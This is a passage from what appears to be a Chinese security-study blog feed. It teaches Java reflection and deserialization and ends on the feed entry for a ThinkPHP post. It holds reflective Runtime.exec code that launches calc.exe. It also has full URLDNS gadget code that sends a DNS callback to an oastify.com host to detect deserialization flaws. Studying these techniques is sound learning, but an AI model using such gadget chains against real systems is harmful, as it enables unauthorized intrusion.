class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><blockquote><p>但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p><p>而使用类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误；</p><p>而使用实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。</p><p>所以我们在获取class对象中，一般使用Class.forName方法去获取。</p></blockquote><h2 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h2><blockquote><p>获取成员变量Field位于java.lang.reflect.Field包中</p><p>Field[] getFields() ：获取所有public修饰的成员变量</p><p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p><p>Field getField(String name) 获取指定名称的 public修饰的成员变量</p><p>Field getDeclaredField(String name) 获取指定的成员变量</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">        Field[] fieldArray1 = c3.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fieldArray1) &#123;</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出:</span></span><br><span class="line"><span class="comment">// com.n4c1.www.Person</span></span><br><span class="line"><span class="comment">// name</span></span><br><span class="line"><span class="comment">// age</span></span><br></pre></td></tr></table></figure><h2 id="获取成员方法Method"><a href="#获取成员方法Method" class="headerlink" title="获取成员方法Method"></a>获取成员方法Method</h2><blockquote><p><strong>Method getMethod(String name, 类&lt;?&gt;… parameterTypes)</strong> &#x2F;&#x2F;返回该类所声明的public方法</p><p><strong>Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes)</strong> &#x2F;&#x2F;返回该类所声明的所有方法</p><p>&#x2F;&#x2F;第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</p><p><strong>Method[] getMethods()</strong> &#x2F;&#x2F;获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</p><p><strong>Method[] getDeclaredMethods()</strong> &#x2F;&#x2F; 获取该类中的所有方法</p></blockquote><h2 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h2><blockquote><p>Constructor&lt;?&gt;[] getConstructors() ：只返回public构造函数</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</p><p>Constructor&lt;&gt; getConstructor(类&lt;?&gt;… parameterTypes) : 匹配和参数配型相符的public构造函数</p><p>Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;… parameterTypes) ： 匹配和参数配型相符的构造函数</p></blockquote><h2 id="通过反射来生成实例化对象"><a href="#通过反射来生成实例化对象" class="headerlink" title="通过反射来生成实例化对象"></a>通过反射来生成实例化对象</h2><h3 id="newInstance-方法创建类对象"><a href="#newInstance-方法创建类对象" class="headerlink" title="newInstance()方法创建类对象"></a>newInstance()方法创建类对象</h3><h3 id="invoke-执行类对象方法"><a href="#invoke-执行类对象方法" class="headerlink" title="invoke()执行类对象方法"></a>invoke()执行类对象方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reflectMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反射测试成功!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.reflect.ReflectTest&quot;</span>); <span class="comment">// 创建Class对象</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance(); <span class="comment">// 创建类实例对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;reflectMethod&quot;</span>); <span class="comment">// 获取reflectMethod方法</span></span><br><span class="line">            method.invoke(m); <span class="comment">// 调用类实例对象方法</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用反射构造Runtime类执行"><a href="#利用反射构造Runtime类执行" class="headerlink" title="利用反射构造Runtime类执行"></a>利用反射构造Runtime类执行</h2><p>反射弹计算器</p><p><code>C:\\WINDOWS\\System32\\calc.exe</code></p><p>Runtime类的构造方法是private权限私有的,反射机制也是有限制的，并不能饶过private权限的检查。</p><p>因此我们不能使用newInstance()来创建一个对象Runtime()</p><p>但是可以直接调用其类方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">RuntimeMethod</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//通过 getMethod 方法获取 Runtime 类中的 getRuntime 方法的 Method 对象。这个方法用于获取当前运行时对象。</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> RuntimeMethod.invoke(c1); <span class="comment">//使用反射调用 getRuntime 方法，得到 Runtime 类的实例。invoke 方法用于调用指定对象的方法，这里调用了 getRuntime 方法。</span></span><br><span class="line">        method.invoke(m, <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(c1),<span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="设置setAccessible-true-暴力访问权限"><a href="#设置setAccessible-true-暴力访问权限" class="headerlink" title="设置setAccessible(true)暴力访问权限"></a>设置setAccessible(true)暴力访问权限</h2><blockquote><p>在一般情况下，我们使用反射机制不能对类的私有private字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用AccessibleObject上的setAccessible()方法来允许访问。</p><p>Java.lang.reflect.AccessibleObject类是Field，Method和Constructor类对象的基类，可以提供将反射对象标记为使用它抑制摸人Java访问控制检查的功能，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我并没有成功弹计算器, 不知道是不是jdk版本的问题</p><p>换成jdk1.8这里就可以了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309112318876.png" alt="image-20240309112318876"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p><strong>序列化</strong>: ObjectOutputStream.WriteObject</p><p><strong>反序列化</strong>: ObjectInputStream.readObject</p><blockquote><p>只有实现 了Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列</p><p>Serializable 接口是 Java 提供的序列化接口,一个实现 Serializable 接口的子类也是可以被序列化的。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Useri</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Useri</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        Serialize(user);</span><br><span class="line"></span><br><span class="line">        Unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Useri obj)</span> <span class="keyword">throws</span>  Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialized:&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Useri</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Useri</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>transient</strong></p><p>transient 标识的对象成员变量不参与序列化</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>可以看见反序列化后, 会自动调用readObject()方法(在php中则是__wakeup这样的方法), 而如果程序对readObject()进行了重写, 并添加了一些危险操作, 就会在反序列化后自动进行这些个危险操作, </p><h3 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h3><blockquote><p>入口类一般是<code>Map,Hashmap,HashTable</code>这些集合类，因为集合类型宽泛（泛型），因此肯定继承了<code>Serializeable</code>接口，在<code>Hashmap</code>类中也重写了<code>readObject</code>方法</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309195913040.png" alt="image-20240309195913040"></p><p>为什么重写?</p><blockquote><p>HashMap中，由于Entry的存放位置是根据Key的Hash值来计算，然后存放到数组中的，对于同一个Key，在不同的JVM实现中计算得出的Hash值可能是不同的。<br>Hash值不同导致的结果就是：有可能一个HashMap对象的反序列化结果与序列化之前的结果不一致。即有可能序列化之前，Key&#x3D;’AAA’的元素放在数组的第0个位置，而反序列化值后，根据Key获取元素的时候，可能需要从数组为2的位置来获取，而此时获取到的数据与序列化之前肯定是不同的</p></blockquote><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>以ysoserial中的URLDNS作为一个例子</p><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>上面已经看见了hashMap对readObject的重写, 重点关注以下内容, 在readObject的最后, 调用的putVal</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309201854085.png" alt="image-20240309201854085"></p><p>首先跟进hash函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309202142278.png" alt="image-20240309202142278"></p><p>这里调用了key.hashCode(), 而Object key是可控的, 因此就可以调用可控类下的hashCode()方法</p><p>现在转向URL类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309203605526.png" alt="image-20240309203605526"></p><p>我们发现URL类下也有一个hashCode方法, 因此如果我们将可控类传入为一个URL对象, 这里的hashCode就会被调用</p><p>但是这里存在一个hashCode值的判断, 当其不为-1时直接返回hashCode</p><p>好在其默认值为-1, 也就是说这里会转到hashCode &#x3D; handler.hashCode(this);</p><p>继续跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309204051582.png" alt="image-20240309204051582"></p><p>观察第367行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure><p>这是一个获取主机地址的函数</p><p>因此, 如果我们传入一个vps的url地址, 这里就会触发一次对我们vps地址的解析, </p><p>倘若vps收到这个解析, 就能够证明反序列化漏洞的存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> unserialize();</span><br><span class="line">        System.out.println(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有趣的是这里序列化时也会发起一个dns请求</p><p>调试看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213620334.png" alt="image-20240309213620334"></p><p>跟进put方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213725383.png" alt="image-20240309213725383"></p><p>下一步直接调用了putVal 且key就是我们要解析的URL</p><p>所以, 在序列化时也会发起一次dns解析</p><p>再调试反序列化, 也会执行到这里</p><p>因此就无法判断哪一个请求是来自反序列化</p><p>此时就要引入上面提到的反射</p><p>通过反射, 在put时将hashCode的值设置为-1, 从而不执行后面的一系列方法, 在此之后, 又将hashCode设置为其他数字, 使其在反序列化时又能够触发dns请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url, <span class="number">123</span>); <span class="comment">// 修改url中的hashcode为非-1</span></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashcode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//hashmap.put(new URL(&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;), 1);</span></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">       <span class="comment">// Object obj = unserialize();</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;obj&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时,序列化时就不会产出dns请求, 而反序列化时会发起dns</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java基础语法&quot;&gt;&lt;a href=&quot;#Java基础语法&quot; class=&quot;headerlink&quot; title=&quot;Java基础语法&quot;&gt;&lt;/a&gt;Java基础语法&lt;/h1&gt;&lt;h2 id=&quot;SOUT和SOUF输出&quot;&gt;&lt;a href=&quot;#SOUT和SOUF输出&quot; class</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.1.x反序列化</title>
    <link href="http://example.com/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-03-04T14:28:24.000Z</published>
    <updated>2024-03-06T09:23:39.418Z</updated>
    
